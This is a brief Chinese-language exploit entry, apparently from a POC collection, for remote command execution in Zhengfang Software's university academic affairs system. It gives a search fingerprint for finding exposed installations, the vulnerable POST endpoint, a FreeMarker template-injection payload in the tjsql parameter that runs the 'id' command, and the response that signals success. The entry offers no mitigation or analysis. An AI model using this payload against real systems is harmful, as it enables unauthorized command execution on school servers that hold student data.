# 正方软件股份有限公司教务系统zdytj_cxParserColumnWhithSQL2存在远程命令执行漏洞

正方软件股份有限公司教务系统 ｜ 命令执行 ｜ —
- **指纹**：`body="正方软件股份有限公司"`
- **请求**：`POST /zdytj/zdytj_cxParserColumnWhithSQL2.html HTTP/1.1`

**Payload**
```
tjsql=select '<#assign x="freemarker.template.utility.Execute"?new()><#assign r=x("id")>' col_${r?replace("[^a-zA-Z0-9]","_","r")} from dual
```
- **响应特征**：200 0_root